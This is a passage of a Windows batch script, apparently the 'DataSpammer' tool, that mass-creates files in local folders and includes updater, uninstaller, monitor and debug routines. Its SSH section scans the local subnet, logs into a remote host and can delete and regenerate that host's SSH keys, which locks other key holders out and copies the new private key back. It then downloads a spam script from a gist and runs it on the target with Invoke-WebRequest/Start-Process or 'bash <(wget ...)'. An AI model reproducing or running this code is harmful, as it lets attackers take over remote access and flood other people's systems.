    set "directory.startmenu=%ProgramData%\Microsoft\Windows\Start Menu\Programs"
    goto startmenu.custom.name

:startmenu.custom.name
    call :filename.check default-filename "Enter the Filename:"

:startmenu.start
    cd /d "%directory.startmenu%"
    goto spam.normal.top

:ssh.spam
    if "%logging%"=="1" ( call :log Opened_SSH_Spam INFO )
    if "%logging%"=="1" ( call :log Listing_Local_IPs INFO )
    
    echo Enter the IP or the Hostename of the Device
    call :sys.lt 2
    echo:
    echo:
    :: Use nmap to find local IPs
    for /f "delims=" %%a in ('where nmap') do (
        set "where_output=%%a"
    )
    if defined where_output ( echo Scanning Local Subnet for IPs (takes ca. 10secs) && where_output nmap -sn 192.168.1.0/24 ) else ( echo Listing ARP Cache IPs && arp -a )
    
    echo:
    echo:
    echo:
    set /P ssh-ip=Enter the IP:
    set /P ssh-name=Enter the Username:
    set /P ssh-filecount=Enter the Filecount:
    set /P ssh-key=Enter the SSH-Key:
    call :sys.verify.execution
    cls

:ssh.hijack
    echo Should the SSH-Keys be regenerated?
    echo This will prohibit anyone with the Old Keys from Accessing the Target
    echo:
    echo [1] Yes
    echo:
    echo [2] No
    echo:
    echo:
    choice /C 12 /M "Choose an option from above:"
        set _erl=%errorlevel%
        if %_erl%==1 set "ssh.regen=1" && goto ssh.start.spam
        if %_erl%==2 set "ssh.regen=0" && goto ssh.start.spam
    goto ssh.hijack

:ssh.start.spam
    echo Is the SSH Host running Windows or Linux?
    echo:
    echo [1] Windows
    echo:
    echo [2] Linux
    echo:
    echo:
    choice /C 12 /M "Choose an option from above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto spam.ssh.target.win
        if %_erl%==2 goto spam.ssh.target.lx
    goto ssh.start.spam


:spam.ssh.target.win
    setlocal EnableDelayedExpansion
    if "%logging%"=="1" ( call :log Spamming_Windows_SSH_Target INFO )

    if "%ssh.regen%"=="1" (
        echo Regenerating SSH keys on target...
        :: Generate New Keys
        if defined ssh-key (
            ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "del /Q C:\Users\%ssh-name%\.ssh\* && ssh-keygen -t rsa -b 4096 -f C:\Users\%ssh-name%\.ssh\id_rsa -N \"\" && type C:\Users\%ssh-name%\.ssh\id_rsa" > new_ssh_key.txt
        ) else (
            ssh %ssh-name%@%ssh-ip% "del /Q C:\Users\%ssh-name%\.ssh\* && ssh-keygen -t rsa -b 4096 -f C:\Users\%ssh-name%\.ssh\id_rsa -N \"\" && type C:\Users\%ssh-name%\.ssh\id_rsa" > new_ssh_key.txt
        )
        if errorlevel 1 (
            echo [ERROR] SSH key regeneration failed!
            goto ssh.done
        )
        echo New SSH private key generated and saved to new_ssh_key.txt:
        COPY new_ssh_key.txt CON
        type new_ssh_key.txt | clip
        :: Update the ssh-key variable to use the new key for the following connection
        set "ssh-key=new_ssh_key.txt"
    )

    set "ssh_command=%powershell.short% -Command \"& { Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/4ee726c3d20d9f028b7e15a057c85163/raw/825fbd4af7339fab4f7bd62dd75f2cf9a239412b/spam.bat' -OutFile 'spam.bat'; Start-Process 'cmd.exe' -ArgumentList '/c spam.bat %ssh_filecount%' }\""

    echo Connecting to Windows SSH target...
    if defined ssh-key (
        ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "!ssh_command!"
    ) else (
        ssh %ssh-name%@%ssh-ip% "!ssh_command!"
    )
    color %color%
    if errorlevel 1 (
        echo [ERROR] SSH connection failed!
        goto ssh.done
    )

    echo Successfully executed SSH connection.
    goto ssh.done


:spam.ssh.target.lx
    setlocal EnableDelayedExpansion
    if "%logging%"=="1" ( call :log Spamming_Linux_SSH_Target INFO )

    if "%ssh.regen%"=="1" (
        echo Regenerating SSH keys on target...
        :: Generate New Keys
        if defined ssh-key (
            ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "rm -f ~/.ssh/id_rsa ~/.ssh/id_rsa.pub && ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N \"\" && cat ~/.ssh/id_rsa" > new_ssh_key.txt
        ) else (
            ssh %ssh-name%@%ssh-ip% "rm -f ~/.ssh/id_rsa ~/.ssh/id_rsa.pub && ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N \"\" && cat ~/.ssh/id_rsa" > new_ssh_key.txt
        )
        if errorlevel 1 (
            echo [ERROR] SSH key regeneration failed!
            goto ssh.done
        )
        echo New SSH private key generated and saved to new_ssh_key.txt:
        type new_ssh_key.txt
        type new_ssh_key.txt | clip
        :: Update the ssh-key variable to use the new key for subsequent connections
        set "ssh-key=new_ssh_key.txt"
    )

    set "ssh_command=bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %ssh-filecount%"
    
    echo Connecting to SSH target...
    if defined ssh-key (
        ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "!ssh_command!"
    ) else (
        ssh %ssh-name%@%ssh-ip% "!ssh_command!"
    )
    color %color%
    if errorlevel 1 (
        echo [ERROR] SSH connection failed!
        goto ssh.done
    )

    echo Successfully executed SSH connection.
    goto ssh.done


:ssh.done
    if %logging% == 1 ( call :log Finished_SSH_Spam_Files:_%ssh-filecount%_Host_%ssh-name% INFO )
    call :done "Created %ssh-filecount% Files on %ssh-name%@%ssh-ip%"

:desktop.icon.spam
    if %logging% == 1 ( call :log Opened_Desktop_Spam INFO )
    
    call :filename.check desk.spam.name "Enter the Filename:"

    set /p desk.spam.format=Choose the Format (without the dot):
    set /p desk.spam.content=Enter the File-Content:

    if "%default-filecount%"=="notused" set /P filecount=How many Files should be created:
    if not "%default-filecount%"=="notused" set "desk.filecount=%default-filecount%"

    cls
    echo Starting.....
    call :sys.lt 2
    cd /d "%userprofile%\Desktop"
    set /a x=1

    for /L %%i in (1,1,%desk.filecount%) do (
        echo Creating File %desk.spam.name%%x%.%desk.spam.format%
        >> "%userprofile%\Desktop\%desk.spam.name%%x%.%desk.spam.format%" echo %desk.spam.content%
        set /a x+=1
    )

    if %logging% == 1 ( call :log Finished_Spamming_Files:_%deskspamlimitedvar% INFO )
    call :done "The Script Created %deskspamlimitedvar% Files."


:normal.text.spam
    if %logging% == 1 ( call :log Opened_Normal_Spam INFO )
    if not "%default_directory%"=="notused" cd /d "%default_directory%" && goto spam.directory.set
    call :directory.input encrypt-dir "Enter the Directory: "

:spam.directory.set
    call :filename.check filename "Enter the Filename:"
    if "%default-filecount%"=="notused" set /P filecount=How many Files should be created:
    if not "%default-filecount%"=="notused" set "filecount=%default-filecount%"
    
    set /P defaultspam.content=Enter the File Content:
    
:spam.normal.top
    set /a x=1
    cd /d "%default_directory%"

    for /L %%i in (1,1,%filecount%) do (
        echo Creating File %default-filename%%x%.txt
        >> "%default-filename%%x%.txt" echo %defaultspam.content%
        set /a x+=1
    )

    if %logging% == 1 ( call :log Finished_Spamming_Files:_%filecount% INFO )
    call :done "The Script Created %filecount% Files."




:fast.git.update
    :: Fast Update
    cd /d "%temp%"
    echo Checking for Updates...
    set "api_url=https://api.github.com/repos/PIRANY1/DataSpammer/releases/latest"
    curl -s %api_url% > apianswer.txt
    call :sys.lt 2
    for /f "tokens=2 delims=:, " %%a in ('findstr /R /C:"\"tag_name\"" apianswer.txt') do (
        set "latest_version=%%a"
    )
    set "latest_version=%latest_version:"=%"

    if "%latest_version%" equ "v6" (
        set "uptodate=up"
    ) else (
        set "uptodate=%current-script-version%"
    )

    if "%uptodate%"=="up" (
        echo The Script is up-to-date [Version:%latest_version%]
    ) else (
        echo Your Script is outdated [Newest Version: %latest_version% Script Version:%current-script-version%]
    )
    exit /b %errorlevel%


:sys.delete.script  
    :: Delete Script Dialog
    echo: 
    call :sys.lt 1
    echo You are about to delete the whole script. Are you sure?
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo You are about to delete the whole script. Are you sure?
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] Yes, Delete the Whole Script
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Open the Github-Repo
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] No Go Back
    call :sys.lt 1
    echo:
    echo:
    choice /C 123S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto sys.delete.script.check.elevation
        if %_erl%==2 explorer "https://github.com/PIRANY1/DataSpammer" && goto sys.delete.script
        if %_erl%==3 goto cancel
        if %_erl%==4 call :standby
    goto sys.delete.script

:sys.delete.script.check.elevation
    :: Check if Script is elevated
    net session >nul 2>&1
    if %errorLevel% == 0 ( 
        goto sys.delete.script.confirmed 
    ) else ( 
        echo The Script is not running as Administrator. Please start the Script as Administrator in order to delete it.
        call :sys.lt 4
        explorer "%~dp0"
        goto cancel
    )
   
:sys.delete.script.confirmed
    :: Delete Script
    if exist "%~dp0\LICENSE" del "%~dp0\LICENSE"
    if exist "%~dp0\README.md" del "%~dp0\README.md"
    if exist "%USERPROFILE%\Desktop\DataSpammer.lnk" "erase %USERPROFILE%\Desktop\DataSpammer.lnk"
    if exist ""%ProgramData%\Microsoft\Windows\Start Menu\Programs\Dataspammer.bat"" erase "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Dataspammer.bat"
    if exist "%userprofile%\Documents\DataSpammerLog\" del /S /Q "%userprofile%\Documents\DataSpammerLog"
    if exist "%~dp0\dataspammer.bat" del "%~dp0\dataspammer.bat"
    reg query "HKCU\Software\DataSpammer" /v Installed >nul 2>&1
    if not %errorlevel% neq 0 ( reg delete "HKCU\Software\DataSpammer" /f )
    ASSOC .dts=
    FTYPE dtsfile=

    echo Uninstall Successfulled
    
:restart.script
    :: Restart Script
    if "%logging%"=="1" ( call :log Restarting_Script WARN )
    erase "%~dp0\dataspammer.lock" >nul 2>&1
    call :send_message Script is restarting
    call :send_message Terminating %PID%
    echo: > %temp%\DataSpammerClose.txt
    cmd /c "%~dp0\dataspammer.bat"
    goto cancel


:monitor
    :: When Monitor is invoked, it observes the script and provides details about its current state.
    :: Monitor is still Experimental & may cause problems
    @echo off
    setlocal EnableDelayedExpansion
    cls
    del "%temp%\DataSpammerCrashed.txt" > nul
    del "%temp%\DataSpammerClose.txt" > nul
    title Monitoring DataSpammer PID: %~2
    echo Opened Monitor Socket.
    echo Waiting for Startup to Finish...
    if exist "%temp%\socket.con " (
        del "%temp%\socket.con" >nul
        echo Socket Connection Established.
    )
    title Monitoring DataSpammer.bat
    :: Parse PID from Main Process
    set "PID.DTS=%~2"
    echo PID: %PID.DTS%
    set "batScript=%temp%\dts-monitor.bat"
    erase "%batScript%" >nul


    :: Observe Process, loop and if its not running, write to a file
    (
        echo @echo off
        echo setlocal
        echo Monitoring DataSpammer.bat with PID %PID.DTS%
        echo :check_process
        echo tasklist /FI "PID eq %PID.DTS%" ^| findstr /R /C:" %PIDToCheck% " ^>nul
        echo if errorlevel 1 ^(
        echo    echo DataSpammmer with PID %PID.DTS% crashed at %%date%% %%time%% ^> "%%temp%%\DataSpammerCrashed.txt"
        echo    echo DataSpammmer with PID %PID.DTS% crashed at %%date%% %%time%%
        echo    exit /b %errorlevel%
        echo ^)
        echo timeout /t 1 ^>nul
        echo goto check_process
    ) > "%batScript%"

    start /b "" "%batScript%"

    
    :: Start a PowerShell process to monitor the DataSpammer.bat process
    :: Needs to be tested
    :: start "" %powershell.short% -ExecutionPolicy Bypass -Command "& {param([int]$pid) while ($true) {try {Get-Process -Id $pid -ErrorAction Stop} catch {"DataSpammer-Process Crashed at $(Get-Date)" | Out-File -FilePath $env:temp\DataSpammerCrashed.txt; break} Start-Sleep -Seconds 0.5}} -pid %PID%"


    :fullloop
    :: For controlled exits use echo: > %temp%\DataSpammerClose.txt

        for /f "tokens=1-3 delims=:." %%a in ("%time%") do set formatted_time=%%a:%%b:%%c

        :: Check if a Message is available
        if exist "%TEMP%\socket.message" (
            set /p message.monitor=<"%TEMP%\socket.message"
            del "%TEMP%\socket.message" >nul
            echo %formatted_time%: %message.monitor%
        )

        if exist "%temp%\DataSpammerCrashed.txt" (
            del "%temp%\DataSpammerCrashed.txt" >nul
            echo DataSpammer.bat Crashed at !formatted_time!
            timeout /t 5 >nul
            exit /b %errorlevel%
        )
        if exist "%temp%\DataSpammerClose.txt" (
            del "%temp%\DataSpammerClose.txt" >nul
            echo DataSpammer.bat was Closed at !formatted_time!
            timeout /t 5 >nul
            exit /b %errorlevel%
        )

    call :sys.lt 1
    goto fullloop

:dev.options
    :: Dev Options
    title Developer Options - DataSpammer
    echo PID: %PID%
    echo Developer Options
    echo:
    echo [1] Custom Goto
    echo:
    echo [2] @ECHO ON
    echo:
    echo [3] Set a Variable 
    echo:
    echo [4] Restart the Script (Variables will be kept)
    echo:
    echo [5] Restart the Script (Variables wont be kept)
    echo:
    echo [6] List all :signs
    echo:
    echo [7] List all :signs
    echo:
    echo [8] Go Back
    choice /C 12345678S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto dev.options.call.sign
        if %_erl%==2 @echo on && cls && goto dev.options
        if %_erl%==3 set /P var=Enter the Variable Name: && set /P value=Enter the Value: && set %var%=%value% && cls && goto dev.options
        if %_erl%==4 goto top
        if %_erl%==5 goto restart.script
        if %_erl%==6 call :list.vars && pause && cls
        if %_erl%==7 goto settings
        if %_erl%==8 goto debug.info     
        if %_erl%==9 call :standby
    goto dev.options

:debug.info
    echo Monitoring: %monitoring%
    echo Script Version: %current-script-version%
    echo Logging: %logging%
    echo Developer Mode: %developermode%
    echo Color: %color%
    echo Default Filename: %default_filename%
    echo Default Directory: %default_directory%
    echo Update: %update%
    echo Default Domain: %default-domain%
    echo Default File Count: %default-filecount%
    echo Elevation: %elevation%
    echo Skip Security Check: %skip-sec%

:dev.options.call.sign
    :: List all Call Signs
    echo List all Call Signs?
    choice /C YN /M "(Y)es / (N)o"
        set _erl=%errorlevel%
        if %_erl%==1 call :list.vars && cls && set /P jumpto=Enter the Call Sign: && goto %jumpto% 
        if %_erl%==2 cls && set /P jumpto=Enter the Call Sign: && goto %jumpto%
    goto dev.options.call.sign

:sys.new.update.installed
    :: Init New Vars with Content
    echo Parsing Settings File...
    set "config_file=settings.conf"
    for /f "usebackq tokens=1,2 delims==" %%a in (`findstr /v "^::" "%config_file%"`) do (
        set "%%a=%%b"
    )

    :: Extract CHCP Value
    for /f "tokens=2 delims=:" %%a in ('chcp') do set "chcp.value=%%a"

    :: Add new Settings
    if not defined %default_filename% call :update_config "default_filename" "" "notused"
    if not defined %default-domain% call :update_config "default-domain" "" "notused"
    if not defined %default-filecount% call :update_config "default-filecount" "" "notused"
    if not defined %developermode% call :update_config "developermode" "" "0"
    if not defined %logging% call :update_config "logging" "" "1"
    if not defined %default_directory% call :update_config "default_directory" "" "notused"
    if not defined %elevation% call :update_config "elevation" "" "pwsh"
    if not defined %update% call :update_config "update" "" "1"
    if not defined %update% call :update_config "color" "" "02"    
    if not defined %skip-sec% call :update_config "skip-sec" "" "0"
    if not defined %skip-sec% call :update_config "chcp" "" "%chcp.value%"
    call :reset.settings.hash
    
    :: Renew Version Registry Key
    set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DataSpammer"
    if defined ProgramFiles(x86) (
        set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\DataSpammer"
    )
    reg delete "%RegPath%" /v "DisplayVersion" /f
    reg add "%RegPath%" /v "DisplayVersion" /d "%current-script-version%" /f
    cls && echo Updated Settings.
    cls && echo Successfully updated the Registry Key for the Version.
    if %logging% == 1 ( call :log Updated_Script_Version:%current-script-version% INFO )
    if %logging% == 1 ( call :log Errorlevel_after_Update:_%errorlevel% INFO )
    echo Successfully Updated to %current-script-version%
    echo Restarting...
    call :sys.lt 4 count
    goto restart.script


:debuglog
    :: Generate Debug Log, wayyyyyy to much 
    echo Generating Debug Log
    cd /d "%~dp0"
    set SOURCE_DIR="%script.dir%\Debug"
    if exist "%SOURCE_DIR%" rmdir /s /q "%SOURCE_DIR%"
    mkdir Debug
    copy "%userprofile%\Documents\DataSpammerLog\DataSpammer.log" "%SOURCE_DIR%"
    ipconfig > "%SOURCE_DIR%\ipconf.txt"
    msinfo32 /report "%SOURCE_DIR%\msinfo.txt"
    ipconfig /renew /flushdns
    driverquery /FO list /v > "%SOURCE_DIR%\drivers.txt"
    tasklist /v > "%SOURCE_DIR%\tasklist.txt"
    systeminfo > "%SOURCE_DIR%\systeminfo.txt"
    set ZIP_FILE="%script.dir%\debug.log.zip"
    tar -a -cf "%ZIP_FILE%" -C "%SOURCE_DIR%" .
    del /s /q "%SOURCE_DIR%"


:debug.done
    :: Display the Debug Log Options
    echo Successfully Generated debug.log.zip
    echo: 
    echo [1] Copy to Clipboard
    echo:
    echo [2] Open GitHub Repository
    echo: 
    echo [3] Delete Debug Files and Go Back
    echo: 
    echo [4] Go Back
    echo:
    echo:
    set /P debuglog=Choose an Option from Above
    choice /C 1234S /T 120 /D S  /M "Choose an Option from Above:"
    set _erl=%errorlevel%
    if %_erl%==1 echo %ZIP_FILE% | clip && cls && echo Copied debug.log.zip to your Clipboard && pause
    if %_erl%==2 explorer "https://github.com/PIRANY1/DataSpammer/issues"
    if %_erl%==3 rmdir /s /q "%SOURCE_DIR%" && goto advanced.options
    if %_erl%==4 goto advanced.options
    if %_erl%==5 call :standby
    goto debug.done
    
    :: Collect Functionalities HERE..
    :: DNS & HTTPS & Basic Filespam 
    :: Run all :signs & functions & check for updates

:debugtest
    :: Start Debug Test
    echo Running Debug Test...
    set "starttime=%time%"
    echo %time%
    call :sys.lt 10 count
    echo %time%
    set "endtime=%time%"
    

    :: Calc time Diff in ms
    call :TimeDiffInMs "%starttime%" "%endtime%"
    echo Time difference: %timeDiffMs%ms

    :: Check Win Version
    call :win.version.check
    echo %OSEdition%
    echo Type: %OSType%
    echo Version: %OSVersion%
    echo Build: %OSBuild%
    call :generate_random all 40
    
    :: Test Write Config
    >> "%~dp0\settings.conf" echo default-filename=notused
    call :generateRandom
    call :update_config "default-filename" "" "%realrandom%"
    type "%~dp0\settings.conf"

    call :version

    %errormsg%
    echo Errorlevel: %errorlevel%
    echo Finished Testing...
    echo Exiting
    goto cancel


:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: ------------------------------------------------- Functions --------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------

:: ------------------------------
:: :filename.check
:: Prompts the user to enter a filename.
:: Verifies that the filename is valid using :fd.check.
::
:: Arguments:
::   %1 - Variable name (key) to store the user's input
::   %2 - Prompt message to display to the user
::
:: Example:
::   call :filename.check myfile "Enter the target filename: "
::   echo You entered: !myfile!
::
:: Returns:
::   errorlevel 0 if the directory exists and is writable
::   errorlevel 1 if not (loop will re-prompt)
:: ------------------------------
:filename.check
    call :check_args :filename.check "%~1" "%~2"
    set "key=%~1"
    set "prompt=%~2"

    if not "!default-filename!"=="notused" (
        set "!key!=!default-filename!"
        exit /b 0
    )

    :filename.check.sub
    set /p "!key!=!prompt!"

    if not defined !key! (
        echo No filename specified. Please provide a filename.
        goto filename.check.sub
    )

    for /f "delims=" %%A in ('echo !%key%!') do set "path=%%A"

    call :fd.check file "!path!"
    if "!errorlevel!"=="1" (
        goto filename.check.sub
    )

    echo The file "!path!" exists and is writable.
    exit /b 0

:fd.check
    :: Check if a File or a Directory has a valid syntax
    :: Example:
    :: call :fd.check file thisisinvalid//.txt
    :: call :fd.check directory "C:\this\is\invalid\:?.txt"
    call :check_args :fd.check "%~1" "%~2"
    set "type=%~1"
    set "filepath=%~2"
    if "%type%"=="file" (
        echo.%filename% | findstr /R "[\\/:*?\"<>|]" >nul
        if %errorlevel%==0 (
            echo Invalid characters in filename: %filepath%
            exit /b 1
        )
    ) else if "%type%"=="directory" (
        for %%F in ("%filepath%") do (
            echo.%%~nF | findstr /R "[\\/:*?\"<>|]" >nul
            if not errorlevel 1 (
                echo Invalid characters found in filename: %%~nF
                exit /b 1
            )
        )        
    )
    exit /b 0

:: ------------------------------
:: :directory.input
:: Prompts the user to enter a directory path.
:: Verifies that the directory exists and is writable using :rw.check.
::
:: Arguments:
::   %1 - Variable name (key) to store the user's input
::   %2 - Prompt message to display to the user
::
:: Example:
::   call :directory.input mydir "Enter the target directory: "
::   echo You entered: !mydir!
::
:: Returns:
::   errorlevel 0 if the directory exists and is writable
::   errorlevel 1 if not (loop will re-prompt)
:: ------------------------------


:directory.input
    call :check_args :rw.check "%~1" "%~2"
    set "key=%~1"
    set "prompt=%~2"
    
    :directory.input.sub
    set /p "!key!"=!prompt!
    
    if not defined !key! (
        echo No directory specified. Please provide a directory.
        goto directory.input.sub
    )
    
    set "path=!%key%!"
    call :fd.check directory "%path%"
    call :rw.check "%path%"
    if "%errorlevel%"=="1" (
        goto directory.input.sub
    )
    
    echo The directory "!path!" exists and is writable.
    exit /b 0


:: ------------------------------
:: :rw.check
:: Checks whether the given directory exists and is writable.
:: It creates and renames a temporary file to test permissions.
::
:: Arguments:
::   %1 - Full path to the directory to test
::
:: Example:
::   call :rw.check "%temp%"
::
:: Returns:
::   errorlevel 0 if the directory exists and is writable
::   errorlevel 1 if it does not exist or is not writable
:: ------------------------------
:rw.check
    call :check_args :rw.check "%~1" 
    set "path=%~1"

    >>"%path%\file.txt" echo This is a test file to check write permissions.
    if not exist "%path%\file.txt" (
        echo The directory "%path%" does not exist.
        call :log Directory_"%path%"_does_not_exist ERROR
        exit /b 1
    )

    rename "%path%\file.txt" file.locked >nul 2>&1 || (
        echo The directory "%path%" is not writable.
        call :log Directory_"%path%"_is_not_writable ERROR
        erase "%path%\file.txt"
        exit /b 1
    )
    erase "%path%\file.locked" 
    echo The directory "%path%" exists and is writable.
    exit /b 0


:dataspammer.hash.check
    :: Compare local and remote script hash
    if "%current-script-version%"=="v6" (
        set "remote=https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/v6/dataspammer.bat"
    ) else (
        set "remote=https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/dataspammer.bat"
    )
    
    curl -s -o "%TEMP%\dataspammer_remote.bat" "%remote%"
    for /f "tokens=1" %%A in ('certutil -hashfile "%TEMP%\dataspammer_remote.bat" SHA256 ^| find /i /v "SHA256" ^| find /i /v "certutil"') do set "REMOTE_HASH=%%A"
    for /f "tokens=1" %%A in ('certutil -hashfile "%~0" SHA256 ^| find /i /v "SHA256" ^| find /i /v "certutil"') do set "LOCAL_HASH=%%A"
    :: echo Local File: !LOCAL_HASH!
    :: echo Upstream File: !REMOTE_HASH!
    
    if not"!REMOTE_HASH!"=="!LOCAL_HASH!" (
        %errormsg%
        echo The GitHub version of the script differs from your local version.
        echo This could be due to a failed update or manual modifications.
        echo If you did not make these changes, consider redownloading the script to avoid potential issues.
        call :sys.lt 5 count
    )

:verify.settings
        set "settings.file=%~dp0settings.conf"
    
        for /f "tokens=3" %%A in ('reg query "HKCU\Software\DataSpammer" /v SettingsHash 2^>nul') do set "storedhash=%%A"
    
        :: Extract Saved Hash and if none exist create one
        if not defined storedhash (
            echo Generating new Settings Hash...
            cd "%~dp0"
            for /f "delims=" %%h in ('%powershell.short% -Command "(Get-FileHash -Path \"%settings.file%\" -Algorithm SHA256).Hash"') do (
                set "storedhash=%%h"
            )
            set "storedhash=!storedhash: =!"
            reg add "HKCU\Software\DataSpammer" /v SettingsHash /t REG_SZ /d "!storedhash!" /f >nul
            for /f "tokens=3" %%A in ('reg query "HKCU\Software\DataSpammer" /v SettingsHash 2^>nul') do set "storedhash=%%A" 
        )
    
        :: Extract Current Hash from settings.conf
        for /f "delims=" %%h in ('%powershell.short% -Command "(Get-FileHash -Path \"%settings.file%\" -Algorithm SHA256).Hash"') do (
            set "current_hash=%%h"
        )
    
        :: Remove spaces from Hashes
        set "storedhash=!storedhash: =!"
        set "current_hash=!current_hash: =!"

        :: Compare Hashes
        if not "!current_hash!"=="!storedhash!" (
            echo The settings.conf file has been modified unexpectedly.
            echo This could indicate manual changes or potential corruption.
            echo Please review the settings.conf file for any discrepancies or errors.
            echo If you encounter issues, consider reinstalling the script.
            call :sys.lt 10
            exit /b 0
        )

        exit /b 0

:reset.settings.hash
    set "settings.file=%~dp0settings.conf"
    :: Delete Saved Hash and create a new one
    for /f "tokens=3" %%A in ('reg query "HKCU\Software\DataSpammer" /v SettingsHash 2^>nul') do set "storedhash=%%A"

    if defined storedhash (
        reg delete "HKCU\Software\DataSpammer" /v SettingsHash /f
        for /f "delims=" %%h in ('%powershell.short% -Command "(Get-FileHash -Path \"%settings.file%\" -Algorithm SHA256).Hash"') do (
            set "storedhash=%%h"
        )
        set "storedhash=!storedhash: =!"
        reg add "HKCU\Software\DataSpammer" /v SettingsHash /t REG_SZ /d "!storedhash!" /f >nul
    )
    exit /b

:repair.settings
    :: Try to Repair Settings, may fix parser issues
    if not exist "%~dp0settings.conf" ( echo The settings.conf file is missing! && pause && exit /b 1)
    set "config_file=%~dp0settings.conf"
    echo Repairing settings.conf...
    set "output_file=%temp%\settings.conf"
    for /f "usebackq tokens=1,* delims==" %%a in (`findstr /v "^::" "%config_file%"`) do (
        set "key=%%a"
        set "value=%%b"
        >> "%output_file%" echo !key!=!value!
        echo Adding !key! with !value! to %output_file%
    )
    erase "%~dp0settings.conf"
    move /y "%output_file%" "%~dp0settings.conf" 
    echo Repair completed. The settings.conf file has been restored.
    exit /b 0

:: Generate real random numbers ( default %random% is limited to 32767)
:generateRandom
    :: Get Random Numbers
    set "r1=%random%"
    set "r2=%random%"
    set "str=%r1%_%r2%"

    :: Generate Hash
    for /f %%h in ('echo %str% ^| %powershell.short% -command "$s = $input; $h = [BitConverter]::ToString((New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($s))).Replace('-', ''); Write-Output $h"') do (
        set "hash=%%h"
    )

    :: Extract only digits from the hash
    set "digits="
    for /l %%i in (0,1,63) do (
        set "char=!hash:~%%i,1!"
        if "!char!" geq "0" if "!char!" leq "9" set "digits=!digits!!char!"
    )

    if not defined digits set "digits=12345"

    :: Max 5 Digits
    set "realrandom=!digits:~0,5!"
    exit /b
    

:: =====================================
:: call :color "ERROR"
:: Supported Colors: Red, Green, Blue, Gray, White, _Red, _White, _Green, _Yellow
:: call :color Red      "This is red on light white"
:: call :color _Red     "This is red on black"
:: call :color Green    "Green on white"
:: call :color _Green   "Green on black"
:: call :color Blue     "Blue on white"
:: call :color Gray     "Gray background"
:: call :color White    "Bright white"
:: call :color _White   "White on dark gray"
:: call :color _Yellow  "Yellow on black"
:: =====================================

:color
    :: Parameter: color text
    set "color=%~1"
    shift
    set "text=%*"
    set "text=!text:"=!"   
    
    for %%F in (Red Gray Green Blue White _Red _White _Green _Yellow) do (
        set "text=!text:%%F=!"
    )
    
    call :check_args :done "%~1" "%~2"
    if "%errorlevel%"=="1" (
        %errormsg%
        echo %text%
        exit /b 1
    )

    :: Remove underscore
    set "text=!text:_=!"

    :: Remove first space
    if "!text:~0,1!"==" " (
        set "text=!text:~1!"
    )

    :: Check if ANSI support is enabled
    if not "%_NCS%"=="1" (
        echo %text%
        exit /b
    )
    
    :: Set escape code
    if not defined esc (
        for /F %%a in ('echo prompt $E ^| cmd') do set "esc=%%a"
    )
    
    :: Define Colors
    set "Red=41;97m"
    set "Gray=100;97m"
    set "Green=42;97m"
    set "Blue=44;97m"
    set "White=107;91m"
    set "_Red=40;91m"
    set "_White=40;37m"
    set "_Green=40;92m"
    set "_Yellow=40;93m"
    
    :: Select Colors
    for %%F in (Red Gray Green Blue White _Red _White _Green _Yellow) do (
        if /I "%color%"=="%%F" (
            set "code=!%%F!"
        )
    )
    
    :: Return normal color if no match
    if not defined code (
        echo %text%
        exit /b
    )
    
    :: Color output
    <nul set /p "=!esc![!code!!text!!esc![0m"
    echo:
    exit /b



:check_NCS
    :: ===============================
    :: Function: check for NCS Support
    :: ===============================
    
    set "_NCS=1"
    
    :: Get Windows Build
    set "winbuild="
    for /f "tokens=6 delims=[]. " %%G in ('ver') do set "winbuild=%%G"
    
    :: Disable NCS for Old Builds
    if %winbuild% LSS 10586 set "_NCS=0"
    
    :: Check ForceV2 from Registry
    if %winbuild% GEQ 10586 (
        reg query "HKCU\Console" /v ForceV2 %nul2% | find /i "0x0" %nul1% && (
            set "_NCS=0"
        )
    )
    
    :: Export NCS
    set "_NCS=%_NCS%"
    exit /b
    

:sys.lt
    :: Wait for a given time, supports wait.exe
    setlocal EnableDelayedExpansion
    if exist "%~dp0\wait.exe" ( wait.exe %~1 )
    if /i "%~2"=="timeout" (
        timeout /t %~1 >nul
    )
    if /i "%~2"=="count" (
        for /L %%i in (%~1,-1,0) do (
            set "msg=Waiting, %%i seconds remaining..."
            echo !msg!
            ping -n 2 127.0.0.1 >nul
        )
        echo:
    ) else (
        ping -4 -n %~1 127.0.0.1 >nul
    )
    exit /b 0

:parse.settings
    :: Parse Settings from Config
    :: Parser doesnt work when no settings file exist ( crashes script )
    echo Parsing Settings...
    set "config_file=settings.conf"
    for /f "usebackq tokens=1,2 delims==" %%a in (`findstr /v "^::" "%config_file%"`) do (
        set "%%a=%%b"
    )
    exit /b 0

:log
    :: call scheme is:
    :: call :log Opened_verify_tab ( ERROR, INFO etc.) <- OPTIONAL
    :: Use INFO for normal Actions e.g. Opened Menu Foo Bar
    :: Use ERROR for Errors
